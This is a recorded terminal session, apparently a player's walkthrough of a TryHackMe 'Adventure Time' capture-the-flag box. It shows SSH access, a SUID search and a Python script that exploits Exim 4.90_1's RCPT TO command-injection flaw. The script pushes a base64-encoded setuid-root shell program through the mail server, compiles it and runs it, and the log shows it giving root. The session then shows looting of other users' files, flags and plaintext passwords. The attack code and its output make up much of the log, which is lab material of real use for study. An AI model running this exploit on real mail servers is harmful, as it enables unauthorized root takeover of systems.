@@ -1,0 +1,797 @@
+Script started on 2025-01-08 16:14:44+03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[0m[38;5;244m[49m[39m[27m[24m[K
+
+[2A7[0m[49m[39m[38;5;244m╭─[0m[38;5;244m[47m[38;5;232m  [0m[38;5;232m[47m[47m[38;5;232m [0m[38;5;232m[47m[40m[37m[0m[37m[40m[40m[38;5;254m   [1m[38;5;254m[40m[38;5;255m~[0m[38;5;255m[40m[40m[38;5;254m/Desktop/tryhackme.ctf/adventure.time/[1m[38;5;254m[40m[38;5;255maccess[0m[38;5;255m[40m[40m[38;5;254m[0m[38;5;254m[40m[40m[38;5;254m [0m[38;5;254m[40m[49m[30m[0m[30m[49m[39m[38;5;244m························[0m[38;5;244m[49m[30m[0m[30m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m[37m[0m[37m[40m[47m[30m 16:14:44[0m[30m[47m[47m[30m  [0m[30m[47m[47m[30m [0m[30m[47m[49m[39m[38;5;244m─╮
+[0m[38;5;244m[49m[39m[38;5;244m╰─[0m[38;5;244m[49m[39m[0m[49m[39m [0m[49m[39m                                                                                                  [0m[38;5;244m[49m[39m[38;5;244m─╯[0m[38;5;244m[49m[39m[27m[24m[3C[?2004h[?25l8[0m[49m[39m[27m[24m[J[H[2J[3J
+
+
+
+
+
+]2;h471x@winux:~/Desktop/tryhackme.ctf/adventure.time/access]1;..e.time/access]7;file://winux/home/h471x/Desktop/tryhackme.ctf/adventure.time/access[0m[38;5;254m[49m[39m[27m[24m[1m[7m%[27m[1m[0m                                                                                                       [0m[49m[39m[27m[24m[K[0m[27m[24m[J[0m[38;5;244m[49m[39m
+[A[38;5;244m╭─[0m[38;5;244m[47m[38;5;232m  [0m[38;5;232m[47m[47m[38;5;232m [0m[38;5;232m[47m[40m[37m[0m[37m[40m[40m[38;5;254m   [1m[38;5;254m[40m[38;5;255m~[0m[38;5;255m[40m[40m[38;5;254m/Desktop/tryhackme.ctf/adventure.time/[1m[38;5;254m[40m[38;5;255maccess[0m[38;5;255m[40m[40m[38;5;254m[0m[38;5;254m[40m[40m[38;5;254m [0m[38;5;254m[40m[49m[30m[0m[30m[49m[39m[38;5;244m························[0m[38;5;244m[49m[30m[0m[30m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m[37m[0m[37m[40m[47m[30m 16:14:44[0m[30m[47m[47m[30m  [0m[30m[47m[47m[30m [0m[30m[47m[49m[39m[38;5;244m─╮
+[0m[38;5;244m[49m[39m[38;5;244m╰─[0m[38;5;244m[49m[39m[0m[49m[39m [0m[49m[39m[K[98C[0m[49m[39m[38;5;244m─╯[39m[100D[?1h=[?25h[?2004hs[1m[31ms[0m[39m[1m[31ms[0m[39m[90mcript -a ssh.gunter.commands[39m[28D[1m[31ms[1m[31ms[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [27D[0m[39ms[0m[39ms[90mh peppermint-butler@land-of-ooo.com[39m[35D[39mh[39m [39mp[39me[39mp[39mp[39me[39mr[39mm[39mi[39mn[39mt[39m-[39mb[39mu[39mt[39ml[39me[39mr[39m@[39ml[39ma[39mn[39md[39m-[39mo[39mf[39m-[39mo[39mo[39mo[39m.[39mc[39mo[39mm@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17D@land-of-o[2C.com [17Dg@land-of-[2Co.com[16Du@land-of-[2Co.com[16Dn@land-of-[2Co.com[16Dt@land-of-[2Co.com[16De@land-of-[2Co.com[16Dr@land-of-[2Co.com[16D[?1l>[?2004l
+]2;ssh gunter@land-of-ooo.com]1;gunter@land-of-ooo.comgunter@land-of-ooo.com's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+1 package can be updated.
+0 updates are security updates.
+
+Last login: Fri Sep 20 20:41:57 2019 from 192.168.245.129
+]0;gunter@at: ~[01;32mgunter@at[00m:[01;34m~[00m$ ls
+flag4
+]0;gunter@at: ~[01;32mgunter@at[00m:[01;34m~[00m$ cat flga[K[Kag4
+tryhackme{P1ngu1nsRul3!}
+]0;gunter@at: ~[01;32mgunter@at[00m:[01;34m~[00m$ find / -perm -u=s -type f 2W/dev/null[1P/dev/null>/dev/null
+/usr/sbin/pppd
+/usr/sbin/exim4
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+^C
+]0;gunter@at: ~[01;32mgunter@at[00m:[01;34m~[00m$ cd /tmp
+]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ nano exploit.py
+[?1049h[22;0;0t[1;27r(B[m[4l[?7h[39;49m[?1h=[?1h=[?1h=[?25l[39;49m(B[m[H[2J[25;47H(B[0;7m[ New File ](B[m[H(B[0;7m  GNU nano 2.9.3                                  exploit.py                                            [1;103H(B[m[26d(B[0;7m^G(B[m Get Help   (B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut Text   (B[0;7m^J(B[m Justify    (B[0;7m^C(B[m Cur Pos    (B[0;7mM-U(B[m Undo[27d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Uncut Text (B[0;7m^T(B[m To Linter  (B[0;7m^_(B[m Go To Line (B[0;7mM-E(B[m Redo[25d[3d[39;49m(B[m[?12l[?25h[?25l[1;95H(B[0;7mModified(B[m[3d(B[0;1m[36mimport[39m(B[m socket[4d(B[0;1m[36mimport[39m(B[m os[6dserver = (B[0;1m[32m"localhost"[7d[39m(B[mport = 25[8ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)[9ds.connect((server, port))[10dreply = s.recv(1024)[11d(B[0;1m[36mprint[39m(B[m(reply.decode())[12ds.send((B[0;1m[32m'HELO localhost\r\n'[39m(B[m.encode())[13dreply = s.recv(1024)[14dp[25d[K[14dp[?12l[?25h[?25l(B[0;1m[36mprint[39m(B[m(reply.decode())[15ds.send((B[0;1m[32m'MAIL FROM:<>\r\n'[39m(B[m.encode())[16dreply = s.recv(1024)[17d(B[0;1m[36mprint[39m(B[m(reply.decode())[18d(B[0;1m[31m#/bin/bash -c "export PATH=/usr/bin;cd /tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiN[39m(B[m[?12l[?25h[?25l[3;25r[25;1H[11S[1;27r[7;77H(B[0;1m[31mpbmNsdWRlIDxzeXMvdHlwZXMuaD[39m(B[m$[8;1Hpayload = r(B[0;1m[32m'RCPT TO: root+${run{\x2fbin\x2fbash\x20\x2dc\x20\x22export\x20PATH\x3d\x2fusr\x2fbin\x3bcd\[39m(B[m$[9;1Hs.send(payload.encode())[10dreply = s.recv(1024)[11d(B[0;1m[36mprint[39m(B[m(reply.decode())[12ds.send((B[0;1m[32m'DATA\r\n'[39m(B[m.encode())[13dreply = s.recv(1024)[14d(B[0;1m[36mprint[39m(B[m(reply.decode())[15d$nReceived: 8\nRece[?12l[?25h[?25l$1[11P[9G[?12l[?25h[?25lmsg = (B[0;1m[32m'Received: 1\nReceived: 2\nReceived: 3\nReceived: 4\nReceived: 5\nReceived: 6\nReceived: 7\nRecei[39m(B[m$[16;1Hs.send( msg.encode())[17ds.send((B[0;1m[32m'.\r\n'[39m(B[m.encode())[18dreply = s.recv(1024)[19d(B[0;1m[36mprint[39m(B[m(reply)[20ds.close()[21dos.system((B[0;1m[32m'/tmp/s'[39m(B[m)[22d[?12l[?25h[?25l[1;103H[1;95H(B[0;7m        (B[m[25;44H(B[0;7m[ Wrote 31 lines ](B[m[22d[?12l[?25h[?25l[25d[J[27;104H[?12l[?25h[27;1H[?1049l[23;0;0t[?1l>]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ ls
+exploit.py
+[0m[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-apache2.service-CdbyHn[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-bolt.service-v8agg4[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-colord.service-2UZvxM[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-ModemManager.service-Oo5quv[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-rtkit-daemon.service-FdmpVQ[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-systemd-resolved.service-W60ZrP[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-systemd-timesyncd.service-ryCPiU[0m
+[30;42mVMwareDnD[0m
+]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ python3 exploit.py
+Traceback (most recent call last):
+  File "exploit.py", line 7, in <module>
+    s.connect((server, port))
+ConnectionRefusedError: [Errno 111] Connection refused
+]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ cat /etc/exim4/update-exim4.conf.conf 
+# /etc/exim4/update-exim4.conf.conf
+#
+# Edit this file and /etc/mailname by hand and execute update-exim4.conf
+# yourself or use 'dpkg-reconfigure exim4-config'
+#
+# Please note that this is _not_ a dpkg-conffile and that automatic changes
+# to this file might happen. The code handling this will honor your local
+# changes, so this is usually fine, but will break local schemes that mess
+# around with multiple versions of the file.
+#
+# update-exim4.conf uses this file to determine variable values to generate
+# exim configuration macros for the configuration file.
+#
+# Most settings found in here do have corresponding questions in the
+# Debconf configuration, but not all of them.
+#
+# This is a Debian specific file
+
+dc_eximconfig_configtype='local'
+dc_other_hostnames='at'
+dc_local_interfaces='127.0.0.1.60000'
+dc_readhost=''
+dc_relay_domains=''
+dc_minimaldns='false'
+dc_relay_nets=''
+dc_smarthost=''
+CFILEMODE='644'
+dc_use_split_config='false'
+dc_hide_mailname=''
+dc_mailname_in_oh='true'
+dc_localdelivery='mail_spool'
+]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ nano exploit.py
+[?1049h[22;0;0t[1;27r(B[m[4l[?7h[39;49m[?1h=[?1h=[?1h=[?25l[39;49m(B[m[H[2J[25;45H(B[0;7m[ Reading File ](B[m[25;44H(B[0;7m[ Read 31 lines ](B[m[H(B[0;7m  GNU nano 2.9.3                                  exploit.py                                            [1;103H(B[m[26d(B[0;7m^G(B[m Get Help   (B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut Text   (B[0;7m^J(B[m Justify    (B[0;7m^C(B[m Cur Pos    (B[0;7mM-U(B[m Undo[27d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Uncut Text (B[0;7m^T(B[m To Linter  (B[0;7m^_(B[m Go To Line (B[0;7mM-E(B[m Redo[25d[3d(B[0;1m[36mimport[39m(B[m socket[4d(B[0;1m[36mimport[39m(B[m os[6dserver = (B[0;1m[32m"localhost"[7d[39m(B[mport = 25[8ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)[9ds.connect((server, port))[10dreply = s.recv(1024)[11d(B[0;1m[36mprint[39m(B[m(reply.decode())[12ds.send((B[0;1m[32m'HELO localhost\r\n'[39m(B[m.encode())[13dreply = s.recv(1024)[14d(B[0;1m[36mprint[39m(B[m(reply.decode())[15ds.send((B[0;1m[32m'MAIL FROM:<>\r\n'[39m(B[m.encode())[16dreply = s.recv(1024)[17d(B[0;1m[36mprint[39m(B[m(reply.decode())[18d(B[0;1m[31m#/bin/bash -c "export PATH=/usr/bin;cd /tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD[39m(B[m$[19;1Hpayload = r(B[0;1m[32m'RCPT TO: root+${run{\x2fbin\x2fbash\x20\x2dc\x20\x22export\x20PATH\x3d\x2fusr\x2fbin\x3bcd\[39m(B[m$[20;1Hs.send(payload.encode())[21dreply = s.recv(1024)[22d(B[0;1m[36mprint[39m(B[m(reply.decode())[23ds.send((B[0;1m[32m'DATA\r\n'[39m(B[m.encode())[24dreply = s.recv(1024)[3d[?12l[?25h[?25l[4d[?12l[?25h[?25l[5d[?12l[?25h[?25l[6d[?12l[?25h[?25l[7d[?12l[?25h[?25l[7;10H[?12l[?25h[?25l[1;95H(B[0;7mModified(B[m[7;9H [?12l[?25h[?25l[42m [49m(B[m[K[?12l[?25h[?25l 60000[?12l[?25h[?25l[1;103H[1;95H(B[0;7m        (B[m[25;46H(B[0;7mWrote 31 lines ](B[m[7;13H[?12l[?25h[?25l[25d[J[27;104H[?12l[?25h[27;1H[?1049l[23;0;0t[?1l>]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ cat exploit.py 
+import socket
+import os
+
+server = "localhost"
+port = 60000
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((server, port))
+reply = s.recv(1024)
+print(reply.decode())
+s.send('HELO localhost\r\n'.encode())
+reply = s.recv(1024)
+print(reply.decode())
+s.send('MAIL FROM:<>\r\n'.encode())
+reply = s.recv(1024)
+print(reply.decode())
+#/bin/bash -c "export PATH=/usr/bin;cd /tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgppbnQgbWFpbih2b2lkKQp7CnNldHVpZCgwKTsgc2V0Z2lkKDApOyBzeXN0ZW0oIi9iaW4vYmFzaCIpOwp9Cg==|base64 -d|gcc -o s -xc -;/bin/chmod 4111 s" &
+payload = r'RCPT TO: root+${run{\x2fbin\x2fbash\x20\x2dc\x20\x22export\x20PATH\x3d\x2fusr\x2fbin\x3bcd\x20\x2ftmp\x3becho\x20I2luY2x1ZGUgPHN0ZGlvLmg\x2bCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgppbnQgbWFpbih2b2lkKQp7CnNldHVpZCgwKTsgc2V0Z2lkKDApOyBzeXN0ZW0oIi9iaW4vYmFzaCIpOwp9Cg\x3d\x3d\x7cbase64\x20\x2dd\x7cgcc\x20\x2do\x20s\x20\x2dxc\x20\x2d\x3b\x2fbin\x2fchmod\x204111\x20s\x22\x20\x26}@' + server + '\r\n'
+s.send(payload.encode())
+reply = s.recv(1024)
+print(reply.decode())
+s.send('DATA\r\n'.encode())
+reply = s.recv(1024)
+print(reply.decode())
+msg = 'Received: 1\nReceived: 2\nReceived: 3\nReceived: 4\nReceived: 5\nReceived: 6\nReceived: 7\nReceived: 8\nReceived: 9\nReceived: 10\nReceived: 11\nReceived: 12\nReceived: 13\nReceived: 14\nReceived: 15\nReceived: 16\nReceived: 17\nReceived: 18\nReceived: 19\nReceived: 20\nReceived: 21\nReceived: 22\nReceived: 23\nReceived: 24\nReceived: 25\nReceived: 26\nReceived: 27\nReceived: 28\nReceived: 29\nReceived: 30\nReceived: 31\r\n'
+s.send( msg.encode())
+s.send('.\r\n'.encode())
+reply = s.recv(1024)
+print(reply)
+s.close()
+os.system('/tmp/s')
+
+]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ python exploit.py
+220 at ESMTP Exim 4.90_1 Ubuntu Wed, 08 Jan 2025 14:20:45 +0100
+
+250 at Hello localhost [127.0.0.1]
+
+250 OK
+
+250 Accepted
+
+354 Enter message, ending with "." on a line by itself
+
+250 OK id=1tVVzJ-0001GO-9F
+
+sh: 1: /tmp/s: not found
+]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ id
+uid=1007(gunter) gid=1007(gunter) groups=1007(gunter),1012(gcc)
+]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ idpython exploit.py
+220 at ESMTP Exim 4.90_1 Ubuntu Wed, 08 Jan 2025 14:20:51 +0100
+
+250 at Hello localhost [127.0.0.1]
+
+250 OK
+
+250 Accepted
+
+354 Enter message, ending with "." on a line by itself
+
+250 OK id=1tVVzP-0001Gp-V4
+
+]0;root@at: /tmp[01;32mroot@at[00m:[01;34m/tmp[00m# id
+uid=0(root) gid=0(root) groups=0(root),1007(gunter),1012(gcc)
+]0;root@at: /tmp[01;32mroot@at[00m:[01;34m/tmp[00m# cd /root
+]0;root@at: /root[01;32mroot@at[00m:[01;34m/root[00m# ls
+]0;root@at: /root[01;32mroot@at[00m:[01;34m/root[00m# find / -name "flga5[K[K[Kag5" -type f 2>/dev/null
+]0;root@at: /root[01;32mroot@at[00m:[01;34m/root[00m# ls -a
+[0m[01;34m.[0m  [01;34m..[0m  .bash_history  .bashrc  [01;34m.cache[0m  [01;34m.local[0m  .profile
+]0;root@at: /root[01;32mroot@at[00m:[01;34m/root[00m# cd -
+/tmp
+]0;root@at: /tmp[01;32mroot@at[00m:[01;34m/tmp[00m# ls
+exploit.py
+[0m[37;41ms[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-apache2.service-CdbyHn[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-bolt.service-v8agg4[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-colord.service-2UZvxM[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-ModemManager.service-Oo5quv[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-rtkit-daemon.service-FdmpVQ[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-systemd-resolved.service-W60ZrP[0m
+[01;34msystemd-private-29e6be25f9974ff2bbd49dff3dc91e4c-systemd-timesyncd.service-ryCPiU[0m
+[30;42mVMwareDnD[0m
+]0;root@at: /tmp[01;32mroot@at[00m:[01;34m/tmp[00m# cd /home
+]0;root@at: /home[01;32mroot@at[00m:[01;34m/home[00m# ls
+[0m[01;34mapple-guards[0m  [01;34mbubblegum[0m  [01;34mfern[0m  [01;34mfinn[0m  [01;34mgunter[0m  [01;34mjake[0m  [01;34mmarceline[0m  [01;34mpeppermint-butler[0m
+]0;root@at: /home[01;32mroot@at[00m:[01;34m/home[00m# c [Kd jake
+]0;root@at: /home/jake[01;32mroot@at[00m:[01;34m/home/jake[00m# ls
+]0;root@at: /home/jake[01;32mroot@at[00m:[01;34m/home/jake[00m# ls -a
+[0m[01;34m.[0m  [01;34m..[0m  .bash_logout  .bashrc  .profile
+]0;root@at: /home/jake[01;32mroot@at[00m:[01;34m/home/jake[00m# cd ..
+]0;root@at: /home[01;32mroot@at[00m:[01;34m/home[00m# ls
+[0m[01;34mapple-guards[0m  [01;34mbubblegum[0m  [01;34mfern[0m  [01;34mfinn[0m  [01;34mgunter[0m  [01;34mjake[0m  [01;34mmarceline[0m  [01;34mpeppermint-butler[0m
+]0;root@at: /home[01;32mroot@at[00m:[01;34m/home[00m# c [Kd finn
+]0;root@at: /home/finn[01;32mroot@at[00m:[01;34m/home/finn[00m# ls
+]0;root@at: /home/finn[01;32mroot@at[00m:[01;34m/home/finn[00m# cd ..
+]0;root@at: /home[01;32mroot@at[00m:[01;34m/home[00m# cd bubblegum/
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# ls
+[0m[01;34mDesktop[0m    [01;34mDownloads[0m  [01;34mnmap[0m      [01;34mPublic[0m   [01;32msecretServer.py[0m  [01;34mVideos[0m
+[01;34mDocuments[0m  [01;34mMusic[0m      [01;34mPictures[0m  [01;34mSecrets[0m  [01;34mTemplates[0m
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# cd Desktop
+]0;root@at: /home/bubblegum/Desktop[01;32mroot@at[00m:[01;34m/home/bubblegum/Desktop[00m# ls
+]0;root@at: /home/bubblegum/Desktop[01;32mroot@at[00m:[01;34m/home/bubblegum/Desktop[00m# cd ..
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# ls
+[0m[01;34mDesktop[0m    [01;34mDownloads[0m  [01;34mnmap[0m      [01;34mPublic[0m   [01;32msecretServer.py[0m  [01;34mVideos[0m
+[01;34mDocuments[0m  [01;34mMusic[0m      [01;34mPictures[0m  [01;34mSecrets[0m  [01;34mTemplates[0m
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# cd Secrets
+]0;root@at: /home/bubblegum/Secrets[01;32mroot@at[00m:[01;34m/home/bubblegum/Secrets[00m# ls
+bmo.txt
+]0;root@at: /home/bubblegum/Secrets[01;32mroot@at[00m:[01;34m/home/bubblegum/Secrets[00m# cat nmo[K[K[Kbmo.txt
+
+
+
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░░░░▄██████████████████████▄░░░░
+░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
+░░░░█░▄██████████████████▄░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░░░░█░█░░█░░░░░░░░░░░░█░░█░█░░░░
+░░░░█░█░░░░░▄▄▄▄▄▄▄▄░░░░░█░█░░░░
+░░░░█░█░░░░░▀▄░░░░▄▀░░░░░█░█░░░░
+░░░░█░█░░░░░░░▀▀▀▀░░░░░░░█░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░█▌░█░▀██████████████████▀░█░▐█░
+░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
+░█░░█░████████████░░░░░██░░█░░█░
+░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
+░█░░█░░░░░░░░░░░░░░░▄░░░░░░█░░█░
+░▀█▄█░░░▐█▌░░░░░░░▄███▄░██░█▄█▀░
+░░░▀█░░█████░░░░░░░░░░░░░░░█▀░░░
+░░░░█░░░▐█▌░░░░░░░░░▄██▄░░░█░░░░
+░░░░█░░░░░░░░░░░░░░▐████▌░░█░░░░
+░░░░█░▄▄▄░▄▄▄░░░░░░░▀██▀░░░█░░░░
+░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
+░░░░▀██████████████████████▀░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░▐██░░░░░░░░░░░░██▌░░░░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+
+
+Secret project number: 211243A
+Name opbject: BMO
+Rol object: Spy
+
+In case of emergency use resetcode: tryhackme{Th1s1s4c0d3F0rBM0}
+
+
+-------
+
+Good job on getting this code!!!!
+You solved all the puzzles and tried harder to the max.
+If you liked this CTF, give a shout out to @n0w4n.
+
+
+]0;root@at: /home/bubblegum/Secrets[01;32mroot@at[00m:[01;34m/home/bubblegum/Secrets[00m# ls
+bmo.txt
+]0;root@at: /home/bubblegum/Secrets[01;32mroot@at[00m:[01;34m/home/bubblegum/Secrets[00m# cd ..
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# ls
+[0m[01;34mDesktop[0m    [01;34mDownloads[0m  [01;34mnmap[0m      [01;34mPublic[0m   [01;32msecretServer.py[0m  [01;34mVideos[0m
+[01;34mDocuments[0m  [01;34mMusic[0m      [01;34mPictures[0m  [01;34mSecrets[0m  [01;34mTemplates[0m
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# cat secretServer.py 
+#!/usr/bin/python
+
+import socket
+import sys
+from thread import *
+
+HOST = ''	# Symbolic name meaning all available interfaces
+PORT = 31337	# Arbitrary non-privileged port
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print 'Socket created'
+
+#Bind socket to local host and port
+try:
+	s.bind((HOST, PORT))
+except socket.error as msg:
+	print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+	sys.exit()
+	
+print 'Socket bind complete'
+
+#Start listening on socket
+s.listen(25)
+print 'Socket now listening'
+
+#Function for handling connections. This will be used to create threads
+def clientthread(conn):
+	#Sending message to connected client
+	conn.send('Hello Princess Bubblegum. What is the magic word?\n') #send only takes string
+	
+	#infinite loop so that function do not terminate and thread do not end.
+	while True:
+		
+		#Receiving from client
+		data = conn.recv(1024).rstrip()
+		print data
+		reply = 'The magic word is not ' + data + '\n'
+		if not data:
+			break
+		elif data == 'ricardio':
+                    reply = 'The new username is: apple-guards\n'
+		elif data == 'ApplePie':
+                    reply = 'The password of peppermint-butler is: That Black Magic\n'
+		
+		conn.sendall(reply)
+	
+	#came out of loop
+	conn.close()
+
+#now keep talking with the client
+while 1:
+    #wait to accept a connection - blocking call
+	conn, addr = s.accept()
+	print 'Connected with ' + addr[0] + ':' + str(addr[1])
+	
+	#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
+	start_new_thread(clientthread ,(conn,))
+
+s.close()
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# ls
+[0m[01;34mDesktop[0m    [01;34mDownloads[0m  [01;34mnmap[0m      [01;34mPublic[0m   [01;32msecretServer.py[0m  [01;34mVideos[0m
+[01;34mDocuments[0m  [01;34mMusic[0m      [01;34mPictures[0m  [01;34mSecrets[0m  [01;34mTemplates[0m
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# cd Pictures
+]0;root@at: /home/bubblegum/Pictures[01;32mroot@at[00m:[01;34m/home/bubblegum/Pictures[00m# ls
+]0;root@at: /home/bubblegum/Pictures[01;32mroot@at[00m:[01;34m/home/bubblegum/Pictures[00m# cd ..
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# cd nmap
+]0;root@at: /home/bubblegum/nmap[01;32mroot@at[00m:[01;34m/home/bubblegum/nmap[00m# ls
+[0m[01;34mnmap-6.00[0m  [01;31mnmap-6.00.tgz[0m
+]0;root@at: /home/bubblegum/nmap[01;32mroot@at[00m:[01;34m/home/bubblegum/nmap[00m# ca[K[Kcd nmap-6.00/
+]0;root@at: /home/bubblegum/nmap/nmap-6.00[01;32mroot@at[00m:[01;34m/home/bubblegum/nmap/nmap-6.00[00m# ls
+acinclude.m4           MACLookup.cc        nmap-protocols       nse_nsock.h      scan_engine.o
+aclocal.m4             MACLookup.h         nmap-rpc             nse_nsock.o      [0m[01;34mscripts[0m
+BSDmakefile            MACLookup.o         nmap_rpc.cc          nse_openssl.cc   service_scan.cc
+CHANGELOG              [01;34mmacosx[0m              nmap_rpc.h           nse_openssl.h    service_scan.h
+charpool.cc            main.cc             nmap_rpc.o           nse_pcrelib.cc   service_scan.o
+charpool.h             main.o              nmap-service-probes  nse_pcrelib.h    services.cc
+charpool.o             Makefile            nmap-services        nse_pcrelib.o    services.h
+[01;32mconfig.guess[0m           makefile.dep        nmap_tty.cc          nse_ssl_cert.cc  services.o
+config.log             Makefile.in         nmap_tty.h           nse_ssl_cert.h   [01;32mshtool[0m
+[01;32mconfig.status[0m          [01;32mmissing[0m             nmap_tty.o           nse_utility.cc   struct_ip.h
+[01;32mconfig.sub[0m             [01;34mmswin32[0m             [01;34mnmap-update[0m          nse_utility.h    Target.cc
+[01;32mconfigure[0m              [01;34mnbase[0m               nmap_winconfig.h     nse_utility.o    TargetGroup.cc
+configure.ac           [01;34mncat[0m                [01;34mnping[0m                [01;34mnsock[0m            TargetGroup.h
+COPYING                [01;34mndiff[0m               nse_binlib.cc        osscan2.cc       TargetGroup.o
+[01;32mdepcomp[0m                [01;32mnmap[0m                nse_binlib.h         osscan2.h        Target.h
+[01;34mdocs[0m                   nmap-6.00-1.spec    nse_binlib.o         osscan2.o        Target.o
+FingerPrintResults.cc  nmap_amigaos.h      nse_bit.cc           osscan.cc        targets.cc
+FingerPrintResults.h   nmap.cc             nse_bit.h            osscan.h         targets.h
+FingerPrintResults.o   nmap_config.h       nse_bit.o            osscan.o         targets.o
+FPEngine.cc            nmap_config.h.in    nse_debug.cc         output.cc        tcpip.cc
+FPEngine.h             nmap_dns.cc         nse_debug.h          output.h         tcpip.h
+FPEngine.o             nmap_dns.h          nse_debug.o          output.o         tcpip.o
+FPModel.cc             nmap_dns.o          nse_dnet.cc          payload.cc       timing.cc
+FPModel.o              nmap_error.cc       nse_dnet.h           payload.h        timing.h
+global_structures.h    nmap_error.h        nse_dnet.o           payload.o        timing.o
+HACKING                nmap_error.o        nse_fs.cc            portlist.cc      [01;34mtodo[0m
+idle_scan.cc           nmap.h              nse_fs.h             portlist.h       traceroute.cc
+idle_scan.h            nmap-mac-prefixes   nse_fs.o             portlist.o       traceroute.h
+idle_scan.o            nmap.o              [01;34mnselib[0m               portreasons.cc   traceroute.o
